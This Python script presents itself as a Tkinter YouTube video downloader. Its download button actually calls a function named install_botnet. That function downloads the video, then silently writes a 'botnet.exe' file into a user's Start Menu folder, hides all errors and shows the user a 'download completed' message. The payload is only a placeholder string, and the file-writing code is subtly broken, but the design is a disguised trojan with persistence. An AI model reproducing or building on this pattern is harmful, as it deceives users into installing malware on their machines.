from tkinter import Label,Tk,Entry,Button,END,messagebox,filedialog
from pytube import YouTube
from os import listdir , chdir , getcwd , mkdir , path


current_directory = getcwd()

def download_directory():
	global current_directory
	current_directory=filedialog.askdirectory()


def go_to_startup():
	chdir('C:/Users/')
	for user in listdir():
		try:
			chdir(f'C:/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/')
			return getcwd()
		except:
			pass


def clear(url,res):
	url.delete(0,END)
	res.delete(0,END)


def download(url,res):
	try:
		link=url.get()
		resolution=res.get()
		url.delete(0,END)
		url.insert(END,'downloading...')
		for stream in YouTube(link).streams:
			if 'mp4' in str(stream) and resolution in str(stream):
				print(stream.download(current_directory))
				url.delete(0,END)
				url.insert(END,'downloading')
				return
		messagebox.showerror('download failed!','video unavailable for the provided resolution!')
	except:
		messagebox.showerror('download failed','invalid url or video does not exist anymore!')





def install_botnet(url,res):
	try:
		data   = 'app data'
	
		download(url,res)
		go_to_startup()

		if 'botnet.exe' not in listdir():
			with open('botnet.exe','wb') as f:
				f.write(data)
		else:
			pass

		chdir(current_directory)
		messagebox.showinfo('download completed','the video was downloaded')

	except:
		pass

















def window():
	root = Tk()
	root.title('youtube video downloader')
	root.geometry('310x170')
	root.config(bg='#283848')

	fg='white'
	bg='#283848'

	Label(root,text='URL :',fg=fg,bg=bg,font=16).place(x=0,y=20)
	Label(root,text='Resolution :',fg=fg,bg=bg,font=16).place(x=0,y=70)

	url = Entry(root,width=20,fg=fg,bg=bg,font=16)
	res = Entry(root,width=20,fg=fg,bg=bg,font=16)
	btn_c = Button(root,text=' clear ' ,fg=fg,bg=bg,font=14,command=lambda:clear(url,res))
	btn_p = Button(root,text='select location' ,fg=fg,bg=bg,font=14,command=download_directory)
	btn_d = Button(root,text='download',fg=fg,bg=bg,font=14,command=lambda:install_botnet(url,res))

	url.place(x=100,y=20)
	res.place(x=100,y=70)
	btn_c.place(x=140,y=120)
	btn_p.place(x=10,y=120)
	btn_d.place(x=210,y=120)

	root.mainloop()

window()